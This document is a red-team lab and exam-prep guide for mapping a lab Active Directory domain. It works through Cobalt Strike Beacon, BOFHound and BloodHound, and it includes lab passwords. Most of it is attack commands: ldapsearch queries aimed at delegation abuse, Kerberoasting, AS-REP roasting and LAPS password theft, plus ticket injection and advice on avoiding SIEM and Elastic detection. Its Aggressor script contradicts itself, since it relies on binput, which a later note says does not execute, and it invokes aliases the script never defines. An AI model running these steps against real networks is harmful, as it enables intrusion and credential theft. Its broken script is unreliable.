# Discovery Lab  

>The objective of this lab is to carry out discovery of the CONTOSO domain.  By the end, you will be able to collect data and map attack paths in BloodHound, in a more stealth OPSEC-🟢SAFE way than using the default collectors that will be detected.

## BOFHound

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the Beacon.
3. Enumerate the domain, users, groups, OUs, and GPOs.

    ```Beacon-nocolor
    ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
    ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
    ```

1. Copy the raw Beacon logs to the Attacker Desktop.
  1. From the Windows Terminal, open a tab for Ubuntu.
  2. `cd /mnt/c/Users/Attacker/Desktop`
  3. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
  4. The password is `Passw0rd!`.

1. Parse the logs with BOFHound🧠
  1. `bofhound -i logs`

===

## BloodHound

1. Run BloodHound.
  1. From the Start Menu, open Docker Desktop.
  1. Click the **Containers** link on the left-hand side.
  1. Start all the containers by clicking the 'play' button, and wait for them to start.
  1. From the taskbar, open Microsoft Edge.
  1. Click the BloodHound shortcut in the favourites bar, or manually browse to `http://localhost:8080/ui/login`
  1. The browser should autofil the credentials.  If not, use `admin` : `eA%N4frBrnn2`.

⚠️ You'll likely be prompted to set a new password. You can change it to anything you want.

1. Ingest the BOFHound 🧠 data.
  1. After first login, click the 'start by uploading your data' link.
  1. On the new page, click the 'Upload File(s)' button and select the JSON files produced by BOFHound 🧠.

⚠️ They will be in *C:\\Users\\Attacker\\Desktop\\*.

  1. Wait until the status reaches 'Complete'.

1. Click the **Explore** link in the left-hand menu.
1. Select the Cypher query search box.
1. Using the following cypher query, search for GPOs in BloodHound:
  1. `Match (n:GPO) return n`
  1. Click **Run**.

1. Select the 'Workstation Admins' GPO.
  1. Take note of its Gpcpath.
  1. Expand its 'Affected Objects' and select 'Computers'.

1. Select each computer and note their Obiect ID.

===

## Restricted Groups Data

1. Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.

    ```Beacon-nocolor
    ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
    download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```
1. Sync the file to your Attacker Desktop.

⚠️ View > Downloads.

1. Open the file in Notepad (or VSCode).
  1. Note the SID of the domain group.

1. Add the custom edges in BloodHound.

    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```
    ```Cypher
    MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
    MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
    MERGE (y)-[:AdminTo]->(x)
    ```

BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.

⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.

---

## Exam-Day Recon Automation — Aggressor Script

Instead of copy-pasting each ldapsearch command individually, create a single `.cna` file
that fires all queries with one beacon command. Load once at exam start.

**File:** `C:\Users\Attacker\Desktop\exam-recon.cna`

```java
alias domain_recon {
    binput($1, "ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor");
    binput($1, "ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor");
    binput($1, "ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl");
    binput($1, "ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl");
    binput($1, "ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity");
    binput($1, "ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName");
    binput($1, "ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName");
    binput($1, "ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf");
    binput($1, "ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description");
    binput($1, "ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd");
    binput($1, "ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName");
}
```

**Load at exam start:**
```
CS → Cobalt Strike → Script Manager → Load → C:\Users\Attacker\Desktop\exam-recon.cna
```

**Fire from any beacon — two aliases, run in order:**
```cs
beacon> domain_recon_bulk       // BOFHound 🧠 data — run immediately on first beacon
// check SIEM if available — confirm no alerts before continuing
beacon> domain_recon_targeted   // sensitive queries — run after bulk confirms no alerts
```

Queries queue at the beacon's sleep interval — with `sleep 3 20` set, 11 queries spread over ~40 seconds naturally. The OPSEC risk is **what you query**, not how fast:

| Alias | Queries | Risk |
|-------|---------|------|
| `domain_recon_bulk` | domain/OU/GPO + all objects + trusts | 🟢LOW — looks like domain sync |
| `domain_recon_targeted` | LAPS, delegation, AS-REP, SPNs, descriptions | 🟠MEDIUM — known recon signatures in Elastic rules |

⚠️ **Aggressor alias chaining — use `fireAlias`, not direct calls or `binput`:**
```java
fireAlias($1, "ldapsearch", "(filter) --attributes x,y");  // CORRECT — dispatches to alias table
ldapsearch($1, "(filter) --attributes x,y");               // FAILS — ldapsearch is alias not sub
binput($1, "ldapsearch (filter) --attributes x,y");        // FAILS — display only, no execution
```
- `ldapsearch` is registered as an **alias** by `SA.cna`, not a **sub** — calling it as a function throws `non-existent function &ldapsearch`
- `binput` only echoes text to the beacon console display — no task is sent to the beacon
- `fireAlias($bid, "aliasname", "arg string")` dispatches into the CS alias command table — confirmed working

---

## Additional ldapsearch Queries — Exam-Day Privilege Path Finding

The two Step 3 queries feed BOFHound 🧠 BloodHound and give the full domain picture.
Run these targeted queries in parallel to find quick privilege escalation paths before `BloodHound` finishes processing.
All run as BOF — `OPSEC-🟢SAFE`.

### Delegation — highest value for privilege escalation

```cs
// Unconstrained delegation — any computer/user with unconstrained delegation
// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
beacon> ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl

// Constrained delegation — can impersonate any user to the delegated service
// msDS-AllowedToDelegateTo set = protocol transition possible
beacon> ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
beacon> ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Quick credential attack targets

```cs
// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName

// AS-REP roastable — no Kerberos pre-authentication required
// Can request AS-REP hash without any credentials
beacon> ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName

// Accounts with descriptions — operators sometimes store passwords in the description field
beacon> ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
```

### Local admin access via LAPS

```cs
// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host
// Gives instant lateral movement without Kerberoasting or cracking
beacon> ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
```

### Privileged account identification

```cs
// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
beacon> ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf

// Domain trust enumeration
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
```

### Exam-Day Query Priority Order

Run in this sequence immediately after first beacon — before BloodHound is ready:

| Priority | Query | Why |
|----------|-------|-----|
| 1 | Combined users+groups+computers (`samAccountType` filter) | Full AD picture for BOFHound🧠 |
| 2 | Domain/OU/GPO (`objectClass` filter) | BloodHound path data |
| 3 | Unconstrained delegation | Fastest path to DA if any non-DC has it |
| 4 | Kerberoastable accounts | Avoid honeypots (check SPN before roasting) |
| 5 | AdminCount=1 users | Identify all privileged accounts |
| 6 | AS-REP roastable | No-auth hash grab |
| 7 | LAPS readable | Free local admin password |
| 8 | Descriptions with passwords | Quick win if poorly configured |
| 9 | Trust enumeration | Cross-domain/forest paths |

---

## OPSEC Warnings & Exam-Day Notes

### ldapsearch Returns 0 Results — WinRM Token Limitation

`ldapsearch` binds to the DC using the beacon's current Kerberos token. A beacon landed via
`jump winrm64` has a **Type 3 network logon token** — it is non-forwardable and does not carry
Kerberos credentials for onward connections to the DC.

**Symptom:**
```
Binding to 10.10.120.1
retrieved 0 results total
```

**Fix — establish a proper Kerberos token before running ldapsearch:**

```cs
// Option 1 — make_token with known creds (OPSEC-🟠CAUTION — Event 4648)
beacon> make_token CONTOSO\rsteel <password>
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem

// Option 2 — inject a TGT (OPSEC-🟢SAFE — no new logon event)
beacon> kerberos_ticket_use C:\path\to\rsteel.kirbi
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

> This affects **any** beacon that arrived via WinRM, SCShell, or WMI — all produce
> non-forwardable network logon tokens. Only beacons from interactive sessions or `make_token`
> / `kerberos_ticket_use` have usable Kerberos context for LDAP queries.

---

### `net computers` — Never Use

`net computers` (and all `net *` beacon commands) run via the `shell` built-in which spawns
`cmd.exe` — OPSEC-🔴UNSAFE. It also fails with Error 5 from a network logon token.

| Command | OPSEC | Replacement |
|---------|-------|-------------|
| `net computers` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=805306369)` |
| `net users` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=805306368)` |
| `net groups` | 🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=268435456)` |
